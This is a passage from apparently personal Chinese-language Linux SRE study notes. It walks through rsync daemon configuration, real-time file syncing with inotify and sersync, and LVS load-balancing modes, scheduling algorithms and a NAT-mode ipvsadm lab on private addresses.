2022-06-15 18:40:17 /data/www/aaaa.txt event: OPEN
2022-06-15 18:40:17 /data/www/aaaa.txt event: ATTRIB
2022-06-15 18:40:17 /data/www/aaaa.txt event: CLOSE_WRITE;CLOSE
```

**10.0.0.17：**

```
#1.查看创建触发监控
[root@centos7 ~]# touch /data/www/a.txt
[root@centos7 ~]# ls /data/www/
a.txt
[root@centos7 ~]# touch /data/www/aaaa.txt
```

#### 39.6.3rsync的使用

```
#1.rsync的介绍
rsync 常用于做为 linux系统下的数据镜像备份工具，实现远程同步，支持本地复制，或者与其他SSH、
rsync主机同步数据，支持增量备份，配合任务计划，rsync能实现定时或间隔同步，配合inotify或sersync，可以实现触发式的实时数据同步
官方网站: http://rsync.samba.org/
软件包：rsync，rsync-daemon（CentOS 8）
服务文件：/usr/lib/systemd/system/rsyncd.service
配置文件：/etc/rsyncd.conf
端口：873/tcp






#2.常见选项
-v：显示rsync过程中详细信息。可以使用"-vvvv"获取更详细信息。
-P：显示文件传输的进度信息。(实际上"-P"="--partial --progress"，其中的"--progress"才是显示进度信息的)。
-n --dry-run ：仅测试传输，而不实际传输。常和"-vvvv"配合使用来查看rsync是如何工作的。
-a --archive ：归档模式，表示递归传输并保持文件属性。等同于"-rtopgDl"。
-r --recursive：递归到目录中去。
-t --times：保持mtime属性。强烈建议任何时候都加上"-t"，否则目标文件mtime会设置为系统时间，
导致下次更新
         ：检查出mtime不同从而导致增量传输无效。
-o --owner：保持owner属性(属主)。
-g --group：保持group属性(属组)。
-p --perms：保持perms属性(权限，不包括特殊权限)。
-D       ：是"--device --specials"选项的组合，即也拷贝设备文件和特殊文件。
-l --links：如果文件是软链接文件，则拷贝软链接本身而非软链接所指向的对象
-z       ：传输时进行压缩提高效率
-R --relative：使用相对路径。意味着将命令行中指定的全路径而非路径最尾部的文件名发送给服务端，
包括它们的属性。用法见下文示例。
--size-only ：默认算法是检查文件大小和mtime不同的文件，使用此选项将只检查文件大小。
-u --update ：仅在源mtime比目标已存在文件的mtime新时才拷贝。注意，该选项是接收端判断的，不会影响删除行为。
-d --dirs   ：以不递归的方式拷贝目录本身。默认递归时，如果源为"dir1/file1"，则不会拷贝dir1目录，使用该选项将拷贝dir1但不拷贝file1。
--max-size ：限制rsync传输的最大文件大小。可以使用单位后缀，还可以是一个小数值(例如："--max-size=1.5m")
--min-size ：限制rsync传输的最小文件大小。这可以用于禁止传输小文件或那些垃圾文件。
--exclude   ：指定排除规则来排除不需要传输的文件。
--delete   ：以SRC为主，对DEST进行同步。多则删之，少则补之。注意"--delete"是在接收端执行的，所以它是在
           ：exclude/include规则生效之后才执行的。
-b --backup ：对目标上已存在的文件做一个备份，备份的文件名后默认使用"~"做后缀。
--backup-dir：指定备份文件的保存路径。不指定时默认和待备份文件保存在同一目录下。
-e         ：指定所要使用的远程shell程序，默认为ssh。
--port     ：连接daemon时使用的端口号，默认为873端口。
--password-file：daemon模式时的密码文件，可以从中读取密码实现非交互式。注意，这不是远程shell认证的密码，而是rsync模块认证的密码。
-W --whole-file：rsync将不再使用增量传输，而是全量传输。在网络带宽高于磁盘带宽时，该选项比增量传输更高效。
--existing ：要求只更新目标端已存在的文件，目标端还不存在的文件不传输。注意，使用相对路径时如果上层目录不存在也不会传输。
--ignore-existing：要求只更新目标端不存在的文件。和"--existing"结合使用有特殊功能，见下文
示例。
--remove-source-files：要求删除源端已经成功传输的文件
```

#### 39.6.4两种格式访问rsync daemon服务

![1655291032686](linuxSRE.assets/1655291032686.png)

**10.0.0.8：**

```
#1.#查看rsync服务器的模块名称
[root@data ~]# rsync rsync://10.0.0.18
backup
[root@data ~]# rsync 10.0.0.18::
backup  



#2.访问rsync服务器的共享目录
#把/etc/networks文件传到远程目录下
#推文件
[root@data ~]# rsync /etc/networks root@10.0.0.18::backup
[root@data ~]# rsync /etc/issue  liu@10.0.0.18::backup
[root@data ~]# rsync /etc/passwd 10.0.0.18s::backup



#拉文件
[root@data-server ~]#rsync backup-server::backup/* /opt
[root@data-server ~]#rsync   rsync://backup-server/backup/* /mnt
```

**10.0.0.18**:

```
#1.开启服务
root@backup:~# yum -y install rsync-daemon
root@backup:~# touch /etc/rsyncd.conf
root@backup:~# rsync --daemon
root@backup:~# ss -ntl  #端口873



#2.指定共享文件
root@backup:~# vim /etc/rsyncd.conf
[backup]
path = /data/backup/
read only = no
root@backup:~# systemctl restart rsyncd.service



#3.指定目录给nobody权限，默认用户以nobody访问此目录
root@backup:~# setfacl -m u:nobody:rwx /data/backup/
root@backup:~# mkdir /data/backup/
root@backup:~# killall rsync
root@backup:~# systemctl enable --now rsyncd
 



#4.查看从10.0.0.8上传来的文件
root@backup:~# ll /data/backup/
total 4
-rw-r--r-- 1 nobody nobody 58 Jun 15 22:18 networks
```

#### 39.6.5以独立服务方式运行rsync并实现验证功能

![1655291032686](linuxSRE.assets/1655291032686.png)

**10.0.0.8：**

```
#1.查看远程rsync服务器的模块信息
[root@data ~]# rsync /etc/group rsync://rsyncuser@10.0.0.18/backup



#2.客户端配置密码文件
[root@data ~]#  echo "liusenbiao" > /etc/rsync.pas
[root@data ~]# chmod 600 /etc/rsync.pas
#基于密码远程登录
[root@data ~]# rsync --password-file=/etc/rsync.pas /etc/hosts rsync://rsyncuser@10.0.0.18/backup



#3.notify+rsync+shell脚本实现实时数据同步
#!/bin/bash
SRC='/data/www/'
DEST='rsyncuser@10.0.0.18::backup'
rpm -q inotify-tools &> /dev/null || yum -y install inotify-tools
rpm -q rsync &> /dev/null || yum -y install rsync
inotifywait -mrq --exclude=".*\.swp" --timefmt '%Y-%m-%d %H:%M:%S' --format '%T %w %f' -e create,delete,moved_to,close_write,attrib ${SRC} |while read DATE TIME DIR FILE;do
       FILEPATH=${DIR}${FILE}
       rsync -az --delete --password-file=/etc/rsync.pas $SRC $DEST && echo "At ${TIME} on ${DATE}, file $FILEPATH was backuped up via rsync" >> /var/log/changelist.log
done


#4.查看文件传输日志
[root@centos7 www]# tail -f /var/log/changelist.log
At 00:05:44 on 2022-06-16, file /data/www/a.txt was backuped up via rsync
At 00:08:04 on 2022-06-16, file /data/www/liusenbiao.sql was backuped up via rsync
At 00:08:04 on 2022-06-16, file  
```

![1655309243288](linuxSRE.assets/1655309243288.png)

**10.0.0.18：**

```
#1.安装包
root@backup:~# yum -y install rsync-daemon


#2.创建rsync服务器的配置文件
root@backup:~# cat /etc/rsyncd.conf
uid = root
gid = root
#port = 874
#use chroot = no
max connections = 0
ignore errors
exclude = lost+found/
log file = /var/log/rsyncd.log
pid file = /var/run/rsyncd.pid
lock file = /var/run/rsyncd.lock
reverse lookup = no
#hosts allow = 10.0.0.0/24
[backup]
path = /data/backup/
comment = backup dir
read only = no
auth users = rsyncuser
secrets file = /etc/rsync.pas



#3.服务器端准备目录
root@backup:~# mkdir -pv /data/backup


#4.服务器端生成验证文件
root@backup:~# echo "rsyncuser:liusenbiao" > /etc/rsync.pas
root@backup:~# chmod 600 /etc/rsync.pas



#5.服务器端启动rsync服务
root@backup:~# rsync --daemon
root@backup:~# systemctl start rsyncd


#6.检查远程上传到文件
root@backup:~# ll /data/backup/
total 8
-rw------- 1 root root 2467 Jun 15 23:13 anaconda-ks.cfg
-rwxr-xr-x 1 root root 1060 Jun 15 23:15 group


#6.检查远程上传到文件(基于密码)
root@backup:~# ll /data/backup/
total 12
-rw------- 1 root root 2467 Jun 15 23:13 anaconda-ks.cfg
-rwxr-xr-x 1 root root 1060 Jun 15 23:15 group
-rw-r--r-- 1 root root  158 Jun 15 23:22 hosts


#7.时隔0.5s监控文件变化
root@backup:~# watch -n0.5 ls -l /data/backup/
```

#### 39.6.6sersync实现实时数据同步

##### 39.6.6.1sersync介绍

```
#1.sersync介绍
sersync类似于inotify，同样用于监控，但它克服了inotify的缺点.
inotify最大的不足是会产生重复事件，或者同一个目录下多个文件的操作会产生多个事件，例如，当监控目录中有5个文件时，删除目录时会产生6个监控事件，从而导致重复调用rsync命令。另外比如：vim文件时，inotify会监控到临时文件的事件，但这些事件相对于rsync来说是不应该被监控的
sersync 优点：
sersync是使用c++编写，而且对linux系统文件系统产生的临时文件和重复的文件操作进行过滤，所以在结合rsync同步的时候，节省了运行时耗和网络资源。因此更快。
sersync配置很简单，其中提供了静态编译好的二进制文件和xml配置文件，直接使用即可
sersync使用多线程进行同步，尤其在同步较大文件时，能够保证多个服务器实时保持同步状态
sersync有出错处理机制，通过失败队列对出错的文件重新同步，如果仍旧失败，则按设定时长对同步失败的文件重新同步
sersync不仅可以实现实时同步，另外还自带crontab功能，只需在xml配置文件中开启，即也可以按要求隔一段时间整体同步一次，而无需再额外配置crontab功能
sersync 可以二次开发




#2.sersync项目地址： https://code.google.com/archive/p/sersync/
sersync下载地址： https://code.google.com/archive/p/sersync/downloads
```

##### 39.6.6.2基于rsync daemon实现 sersync

![1655343637223](linuxSRE.assets/1655343637223.png)

**10.0.0.8:**

```
#1.测试远程连接
[root@data ~]# rsync rsync://10.0.0.18
backup         	backup dir
[root@data ~]# rsync rsync://rsyncuser@10.0.0.18/backup
Password: 
drwxr-xr-x             57 2022/06/16 00:09:18 .
-rw-r--r--              0 2022/06/15 18:40:17 aaaa.txt
-rw-r--r--              0 2022/06/15 18:44:18 aaaarr.txt
-rw-r--r--              0 2022/06/16 00:08:04 heman.sql
#拷贝文件
[root@data ~]# rsync anaconda-ks.cfg rsync://rsyncuser@10.0.0.18/backup
Password: liusenbiao



#2.设置非交互密码
[root@data ~]# cat /etc/rsync.pas
liusenbiao
[root@data ~]# chmod 600 /etc/rsync.pas
[root@data ~]# rsync --password-file=/etc/rsync.pas  rsync://rsyncuser@10.0.0.18/backup



#3.确认安装rsync客户端工具
[root@data sersync]# yum -y install rsync




#4.下载基于rsync daemon实现sersync的包并设置环境变量
[root@data ~]# wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/sersync/sersync2.5.4_64bit_binary_stable_final.tar.gz
[root@data ~]# tar xf sersync2.5.4_64bit_binary_stable_final.tar.gz
[root@data ~]# mv GNU-Linux-x86/ /usr/local/sersync
[root@data ~]# echo 'PATH=/usr/local/sersync:$PATH' > /etc/profile.d/sersync.sh
[root@data ~]# source /etc/profile.d/sersync.sh






#5.修改sersync配置文件
[root@data ~]# cd /usr/local/sersync/
[root@data sersync]# mkdir /data/www
[root@data sersync]# vim confxml.xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<head version="2.5">
    <host hostip="localhost" port="8008"></host>
    <debug start="false"/>
    <fileSystem xfs="false"/>
    <filter start="false">
        <exclude expression="(.*)\.svn"></exclude>
        <exclude expression="(.*)\.gz"></exclude>
        <exclude expression="^info/*"></exclude>
        <exclude expression="^static/*"></exclude>
    </filter>
    <inotify>
        <delete start="true"/>
        <createFolder start="true"/>
        <createFile start="false"/>
        <closeWrite start="true"/>
        <moveFrom start="true"/>
        <moveTo start="true"/>
        <attrib start="true"/>   #修改为true属性同步
        <modify start="false"/>
    </inotify>

    <sersync>
            <localpath watch="/data/www">  #修改指定为10.0.0.8下创建的/data/www
            <remote ip="10.0.0.18" name="backup"/> #修改远程主机10.0.0.18下/etc/rsyncd.conf里的backup
             <!--<remote ip="10.0.0.18" name="/data/backup"/>-->  改成真实路径基于ssh验证,先前要打通ssh_key验证
            <!--<remote ip="192.168.8.39" name="tongbu"/>-->
            <!--<remote ip="192.168.8.40" name="tongbu"/>-->
        </localpath>
        <rsync>
            <commonParams params="-artuz"/>
            <auth start="true" users="rsyncuser" passwordfile="/etc/rsync.pas"/>  #修改此行
             <!--<auth start="false" users="rsyncuser" passwordfile="/etc/rsync.pas"/>-->  #修改此行为false,基于ssh验证,先前要打通ssh_key验证
            <userDefinedPort start="false" port="874"/><!-- port=874 -->
            <timeout start="false" time="100"/><!-- timeout=100 -->
            <ssh start="false"/>   #基于ssh验证改为true,先前要打通ssh_key验证            
            


#6.查看帮助
[root@data ~]# sersync2 -h
set the system param
execute：echo 50000000 > /proc/sys/fs/inotify/max_user_watches
execute：echo 327679 > /proc/sys/fs/inotify/max_queued_events
parse the command param
_______________________________________________________
参数-d:启用守护进程模式
参数-r:在监控前，将监控目录与远程主机用rsync命令推送一遍
c参数-n: 指定开启守护线程的数量，默认为10个
参数-o:指定配置文件，默认使用confxml.xml文件
参数-m:单独启用其他模块，使用 -m refreshCDN 开启刷新CDN模块
参数-m:单独启用其他模块，使用 -m socket 开启socket模块
参数-m:单独启用其他模块，使用 -m http 开启http模块
不加-m参数，则默认执行同步程序
________________________________________________________________






#7.以后台方式执行同步
[root@data ~]# sersync2 -dro /usr/local/sersync/confxml.xml
```

**10.0.0.18:**

```
#1.安装相关包
root@backup:~#  yum -y install rsync-daemon



#2.修改配置文件
root@backup:~# vim /etc/rsyncd.conf
uid = root
gid = root
max connections = 0
ignore errors
exclude = lost+found/
log file = /var/log/rsyncd.log
pid file = /var/run/rsyncd.pid
lock file = /var/run/rsyncd.lock
reverse lookup = no
[backup]
path = /data/backup/
comment = backup dir
read only = no
auth users = rsyncuser
secrets file = /etc/rsync.pas




#3.设置密码
root@backup:~# mkdir /data/backup/
[root@data ~]#  echo "rsyncuser:liusenbiao" > /etc/rsync.pas
[root@data ~]# chmod 600 /etc/rsync.pas
root@backup:~# systemctl enable --now rsyncd



#4.查看实时同步
#7.时隔0.5s监控文件变化
root@backup:~# watch -n0.5 ls -l /data/backup/
```

## 40.Linux Virtual Server

### 40.1 LVS介绍

![1655373775693](linuxSRE.assets/1655373775693.png)

```
#1.LVS介绍
LVS：Linux Virtual Server，负载调度器，内核集成，章文嵩（花名 正明）, 阿里的四层SLB(Server Load Balance)是基LVS+keepalived实现




#2.LVS工作原理
VS根据请求报文的目标IP和目标协议及端口将其调度转发至某RS，根据调度算法来挑选RS。LVS是内核级功能，工作在INPUT链的位置，将发往INPUT的流量进行“处理

#2.1查看调度算法
#centos8最新版一共12种调度算法
[root@data ~]# grep -i -C 10 ipvs /boot/config-4.18.0-193.el8.x86_64 
# IPVS scheduler
#
CONFIG_IP_VS_RR=m
CONFIG_IP_VS_WRR=m
CONFIG_IP_VS_LC=m
CONFIG_IP_VS_WLC=m
CONFIG_IP_VS_FO=m
CONFIG_IP_VS_OVF=m
CONFIG_IP_VS_LBLC=m
CONFIG_IP_VS_LBLCR=m
CONFIG_IP_VS_DH=m
CONFIG_IP_VS_SH=m
# CONFIG_IP_VS_MH is not set
CONFIG_IP_VS_SED=m
CONFIG_IP_VS_NQ=m





#3.LVS的优点及应用场景
负载均衡的应用场景为高访问量的业务，提高应用程序的可用性和可靠性， 应用于高访问量的业务。

#3.1优点
1.应用于高访问量的业务
2.扩展应用程序
3.消除单点故障
4.同城容灾(多可用区容灾）
5.跨地域容灾




#4.LVS集群类型中的术语
VS：Virtual Server，Director Server(DS), Dispatcher(调度器)，Load Balancer
RS：Real Server(lvs), upstream server(nginx), backend server(haproxy)
CIP：Client IP
VIP：Virtual serve IP VS外网的IP
DIP：Director IP VS内网的IP
RIP：Real server IP 
访问流程：CIP <--> VIP == DIP <--> RIP
```

### 40.2 LVS工作模式

```
1.LVS集群的工作模式
lvs-nat：修改请求报文的目标IP,多目标IP的DNAT
lvs-dr：操纵封装新的MAC地址
lvs-tun：在原请求IP报文之外新加一个IP首部
lvs-fullnat：修改请求报文的源和目标IP
```

#### 40.2.1 LVS的NAT模式

```
lvs-nat：本质是多目标IP的DNAT，通过将请求报文中的目标地址和目标端口修改为某挑出的RS的RIP和PORT实现转发
（1）RIP和DIP应在同一个IP网络，且应使用私网地址；RS的网关要指向DIP
（2）请求报文和响应报文都必须经由Director转发，Director易于成为系统瓶颈
（3）支持端口映射，可修改请求报文的目标PORT
（4）VS必须是Linux系统，RS可以是任意OS系统
```

**大致架构图**：

![1655374653555](linuxSRE.assets/1655374653555.png)

**NAT具体通讯细节**：

![1655427693372](linux体系.assets/1655427693372.png)

**NAT工作时内部细节：** 

![1655375302187](linuxSRE.assets/1655375302187.png)

#### 40.2.2 LVS的DR模式

```
LVS-DR：Direct Routing，直接路由，LVS默认模式,应用最广泛,通过为请求报文重新封装一个MAC首部进行转发，源MAC是DIP所在的接口的MAC，目标MAC是某挑选出的RS的RIP所在接口的MAC地址；源
IP/PORT，以及目标IP/PORT均保持不变
```

**大致架构图**：

![1655425942446](linux体系.assets/1655425942446.png)

**DR具体通讯细节**：

```
每个Real Server上都配置一个vip,在DR模式下LVS只在接受报文的时候工作，响应的时候是Real Server通过自身配置的vip直接响应到客户端，不走LVS.
```

![1655428268933](linux体系.assets/1655428268933.png)

**DR工作时内部细节：**

```
#0.DR模式的特点：
1. Director和各RS都配置有VIP
2. 确保前端路由器将目标IP为VIP的请求报文发往Director
2.1在前端网关做静态绑定VIP和Director的MAC地址
2.2在RS上使用arptables工具
arptables -A IN -d $VIP -j DROP
arptables -A OUT -s $VIP -j mangle --mangle-ip-s $RIP
在RS上修改内核参数以限制arp通告及应答级别
[root@centos8 ~]# cat /proc/sys/net/ipv4/conf/lo/arp_ignore
0
[root@centos8 ~]# cat /proc/sys/net/ipv4/conf/lo/arp_announce
0
3. RS的RIP可以使用私网地址，也可以是公网地址；RIP与DIP在同一IP网络；RIP的网关不能指向
DIP，以确保响应报文不会经由Director
4. RS和Director要在同一个物理网络
5. 请求报文要经由Director，但响应报文不经由Director，而由RS直接发往Client
6. 不支持端口映射（端口不能修改）
7. 无需开启 ip_forward
8. RS可使用大多数OS系统
```

![1655429540475](linux体系.assets/1655429540475.png)

#### 40.2.3 LVS的TUN模式

```
#1.TUN模式特点：
1.RIP和DIP可以不处于同一物理网络中，RS的网关一般不能指向DIP,且RIP可以和公网通信。也就是说集群节点可以跨互联网实现。DIP, VIP, RIP可以是公网地址
2.RealServer的tun接口上需要配置VIP地址，以便接收director转发过来的数据包，以及作为响应的报文源IP
3. Director转发给RealServer时需要借助隧道，隧道外层的IP头部的源IP是DIP，目标IP是RIP，而RealServer响应给客户端的IP头部是根据隧道内层的IP头分析得到的，源IP是VIP，目标IP是CIP
4.请求报文要经由Director，但响应不经由Director,响应由RealServer自己完成
5.不支持端口映射
6.RS的OS须支持隧道功能



#2.应用场景
一般来说，TUN模式常会用来负载调度缓存服务器组，这些缓存服务器一般放置在不同的网络环境，可以就近折返给客户端。在请求对象不在Cache服务器本地命中的情况下，Cache服务器要向源服务器发送请求，将结果取回，最后将结果返回给用户。
LAN环境一般多采用DR模式，WAN环境虽然可以用TUN模式，但是一般在WAN环境下，请求转发更多的被haproxy/nginx/DNS等实现。因此，TUN模式实际应用的很少,跨机房的应用一般专线光纤连接或DNS调度
```

**大致架构图:**

![1655429685707](linux体系.assets/1655429685707.png)

**TUN具体通讯细节**：

![1655430349771](linux体系.assets/1655430349771.png)

**DR工作时内部细节：**

![1655430373497](linux体系.assets/1655430373497.png)

#### 40.2.4 LVS的FULLNAT模式

```
通过同时修改请求报文的源IP地址和目标IP地址进行转发
CIP --> DIP 
VIP --> RIP 
fullnat模式特点：
1. VIP是公网地址，RIP和DIP是私网地址，且通常不在同一IP网络；因此，RIP的网关一般不会指向DIP
2. RS收到的请求报文源地址是DIP，因此，只需响应给DIP；但Director还要将其发往Client
3. 请求和响应报文都经由Director
4. 相对NAT模式，可以更好的实现LVS-RealServer间跨VLAN通讯
5. 支持端口映射
注意：此类型kernel默认不支持
```



![1655430891247](linux体系.assets/1655430891247.png)

#### 40.2.5 LVS工作模式总结和比较

![1655431405498](linux体系.assets/1655431405498.png)

```
lvs-nat与lvs-fullnat：
请求和响应报文都经由Director
lvs-nat：RIP的网关要指向DIP
lvs-fullnat：RIP和DIP未必在同一IP网络，但要能通信
lvs-dr与lvs-tun：
请求报文要经由Director，但响应报文由RS直接发往Client
lvs-dr：通过封装新的MAC首部实现，通过MAC网络转发
lvs-tun：通过在原IP报文外封装新IP头实现转发，支持远距离通信
```

### 40.3 LVS调度算法

#### 40.3.1静态方法

```
ipvs scheduler：根据其调度时是否考虑各RS当前的负载状态分为两种：静态方法和动态方法

静态方法：
仅根据算法本身进行调度
1.RR：roundrobin，轮询,较常用
2.WRR：Weighted RR，加权轮询,较常用
3.SH：Source Hashing，实现session sticky，源IP地址hash；将来自于同一个IP地址的请求始终发往第一次挑中的RS，从而实现会话绑定
4.DH：Destination Hashing；目标地址哈希，第一次轮询调度至RS，后续将发往同一个目标地址的请求始终转发至第一次挑中的RS，典型使用场景是正向代理缓存场景中的负载均衡,如: Web缓存
5.FO（Weighted Fail Over）调度算法,在此FO算法中，遍历虚拟服务所关联的真实服务器链表，找到还未过载（未设置IP_VS_DEST_F_OVERLOAD标志）
```

#### 40.3.2动态方法

```
主要根据每RS当前的负载状态及调度算法进行调度Overhead=value 较小的RS将被调度 
1.LC：least connections 适用于长连接应用
Overhead=activeconns*256+inactiveconns
2.WLC：Weighted LC，默认调度方法,较常用
Overhead=(activeconns*256+inactiveconns)/weight
3.SED：Shortest Expection Delay，初始连接高权重优先,只检查活动连接,而不考虑非活动连接
Overhead=(activeconns+1)*256/weight
4.NQ：Never Queue，第一轮均匀分配，后续SED
5.LBLC：Locality-Based LC，动态的DH算法，使用场景：根据负载状态实现正向代理,实现Web Cache等 
6.LBLCR：LBLC with Replication，带复制功能的LBLC，解决LBLC负载不均衡问题，从负载重的复制到负载轻的RS,实现Web Cache等
7.OVF（Overflow-connection）调度算法，基于真实服务器的活动连接数量和权重值实现。将新连接调度到权重值最高的真实服务器，直到其活动连接数量超过权重值，之后调度到下一个权重值最高的真实服务器,在此OVF算法中，遍历虚拟服务相关联的真实服务器链表，找到 权重值最高的可用真实服务器。
一个可用的真实服务器需要同时满足以下条件：
  1.未过载（未设置IP_VS_DEST_F_OVERLOAD标志）
  2.真实服务器当前的活动连接数量小于其权重值
  3.其权重值不为零
```

### 40.4 LVS 相关软件

```
#1.程序包：ipvsadm
Unit File: ipvsadm.service
主程序：/usr/sbin/ipvsadm
规则保存工具：/usr/sbin/ipvsadm-save
规则重载工具：/usr/sbin/ipvsadm-restore
配置文件：/etc/sysconfig/ipvsadm-config
ipvs调度规则文件：/etc/sysconfig/ipvsadm



#2.安装包
[root@centos8 ~]# yum -y install ipvsadm



#3.ipvsadm 命令
#3.1ipvsadm核心功能：
集群服务管理：增、删、改
集群服务的RS管理：增、删、改
查看
ipvsadm 工具用法
#管理集群服务
ipvsadm -A|E -t|u|f service-address [-s scheduler] [-p [timeout]] [-M netmask] 
[--pe persistence_engine] [-b sched-flags]
ipvsadm -D -t|u|f service-address #删除
ipvsadm –C #清空
ipvsadm –R #重载,相当于ipvsadm-restore
ipvsadm -S [-n] #保存,相当于ipvsadm-save
#管理集群中的RS
ipvsadm -a|e -t|u|f service-address -r server-address [-g|i|m] [-w weight]  
ipvsadm -d -t|u|f service-address -r server-address
ipvsadm -L|l [options]
ipvsadm -Z [-t|u|f service-address]


#3.2管理集群服务：增、改、删
增、修改：
ipvsadm -A|E -t|u|f service-address [-s scheduler] [-p [timeout]]
说明
service-address：
-t|u|f：
 -t: TCP协议的端口，VIP:TCP_PORT 如: -t 10.0.0.100:80
    -u: UDP协议的端口，VIP:UDP_PORT
    -f：firewall MARK，标记，一个数字       
[-s scheduler]：指定集群的调度算法，默认为wlc

server-address：
     rip[:port] 如省略port，不作端口映射
选项：
lvs类型：
    -g: gateway, dr类型，默认
    -i: ipip, tun类型
    -m: masquerade, nat类型        
-w weight：权重





#4.ipvsadm案例：
#添加(-A)10.0.0.100:80为集群,采用tcp连接(-t),轮询调度算法(-s rr)
[root@centos8 ~]# ipvsadm -A -t 10.0.0.100:80 -s rr
#查看已经添加了的集群
[root@centos8 ~]# ipvsadm -L
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.100:http rr
#查看已经添加了的集群(-n：数字化端口号)
[root@centos8 ~]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.100:80 rr
#添加在10.0.0.100基础上添加(-a)real server(-r)指定nat工作模式(-m),并指定权重(-w)为2,权重不写默认为1
[root@centos8 ~]# ipvsadm -a -t 10.0.0.100:80 -r 10.0.0.7 -m -w 2
[root@centos8 ~]# ipvsadm -a -t 10.0.0.100:80 -r 10.0.0.17 -m
#查看添加real server后的集群
[root@centos8 ~]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  10.0.0.100:80 rr
  -> 10.0.0.7:80                  Masq    2      0          0         
  -> 10.0.0.17:80                 Masq    1      0          0 
#清空集群
[root@centos8 ~]# ipvsadm -C
#删除集群rs
[root@lvs ~]# ipvsadm -d -t 172.16.1.253:80 -r 172.16.1.101
#删除集群
[root@lvs ~]# ipvsadm -D -t 172.16.1.253:80
#修改RS
[root@lvs ~]# ipvsadm -e -t 172.16.1.253:80 -r 172.16.1.101 –g -w 3
#修改集群
[root@lvs ~]# ipvsadm -E -t 172.16.1.253:80 -s wrr
```

### 40.5 LVS的NAT实战

![1655438371440](linux体系.assets/1655438371440.png)

**环境准备：**

```
共四台主机：
一台： internet client：192.168.10.6/24   GW:无 仅主机

一台：lvs  
eth1 仅主机 ubuntu:192.168.10.100/16
eth0 NAT 10.0.0.8/24

两台RS：
RS1: 10.0.0.7/24 GW：10.0.0.8 NAT
RS2: 10.0.0.17/24 GW：10.0.0.8 NAT
```

**VMware配置：**

配置仅主机网段

![1655438870686](linux体系.assets/1655438870686.png)

配置NAT网段：

![1655439010744](linux体系.assets/1655439010744.png)

**Real Server:**

10.0.0.7:

```
#1.安装对应包
[root@rs1 ~]# yum -y install httpd;hostname -I > /var/www/html/index.html;systemctl enable --now httpd
[root@rs1 ~]# vim /var/www/html/index.html
rs1 10.0.0.7




#2.修改网关
[root@rs1 ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.7
PREFIX=24
GATEWAY=10.0.0.8
DNS1=10.0.0.2
DNS2=180.76.76.76
ONBOOT=yes
[root@rs2 ~]# systemctl restart network
[root@rs1 ~]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.8        0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
```

10.0.0.17:

```
#1.安装对应包
[root@rs2 ~]# yum -y install httpd;hostname -I > /var/www/html/index.html;systemctl enable --now httpd
[root@rs2 ~]# vim /var/www/html/index.html
rs2 10.0.0.17




#2.修改网关
[root@rs2 ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.17
PREFIX=24
GATEWAY=10.0.0.8
DNS1=10.0.0.2
DNS2=180.76.76.76
ONBOOT=yes
[root@rs2 ~]# systemctl restart network
[root@rs2 ~]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.8        0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
```

**LVS Server:**

10.0.0.8:

```
#1.测试网页能否被访问
[root@centos8 ~]# curl 10.0.0.7
rs1 10.0.0.7 
[root@centos8 ~]# curl 10.0.0.17
rs2 10.0.0.17 


#2.安装软件包
[root@lvs ~]# yum -y install ipvsadm


#3.配置网关信息
[root@lvs ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
#删除网关10.0.0.2
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.8
PREFIX=24
DNS1=223.5.5.5
DNS2=180.76.76.76
ONBOOT=yes
#在VMware设置添加一个网卡并设置仅主机模式	
#配置eth1的网卡
[root@lvs ~]# cp /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/sysconfig/network-scripts/ifcfg-eth1
[root@lvs ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth1
DEVICE=eth1
NAME=eth1
BOOTPROTO=static
IPADDR=192.168.10.100
PREFIX=24
DNS1=223.5.5.5
DNS2=180.76.76.76
ONBOOT=yes
[root@lvs ~]# systemctl restart network




#4.添加LVS工作模式和调度算法
[root@lvs ~]# ipvsadm -A -t 192.168.10.100:80 -s rr
[root@lvs ~]# ipvsadm -a -t 192.168.10.100:80 -r 10.0.0.67 -m
[root@lvs ~]# ipvsadm -a -t 192.168.10.100:80 -r 10.0.0.17 -m
[root@lvs ~]# ipvsadm -Ln
IP Virtual Server version 1.2.1 (size=4096)
Prot LocalAddress:Port Scheduler Flags
  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn
TCP  192.168.10.100:80 rr
  -> 10.0.0.17:80                 Masq    1      0          0         
  -> 10.0.0.67:80
#修改为加权轮询算法
[root@lvs ~]# ipvsadm -e -t 192.168.10.100:80 -r 10.0.0.17 -m -w 5
#查看连接数量
[root@lvs ~]# ipvsadm -Lnc


  
  
  
#5.设置内核参数ipforward
[root@lvs ~]# vim /etc/sysctl.conf
net.ipv4.ip_forward = 1
[root@lvs ~]# sysctl -p
net.ipv4.ip_forward = 1




#6.持久化保存
[root@lvs ~]# cat /usr/lib/systemd/system/ipvsadm.service
[Unit]
Description=Initialise the Linux Virtual Server
After=syslog.target network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c "exec /sbin/ipvsadm-restore < /etc/sysconfig/ipvsadm"
ExecStop=/bin/bash -c "exec /sbin/ipvsadm-save -n > /etc/sysconfig/ipvsadm"
ExecStop=/sbin/ipvsadm -C
RemainAfterExit=yes

[Install]
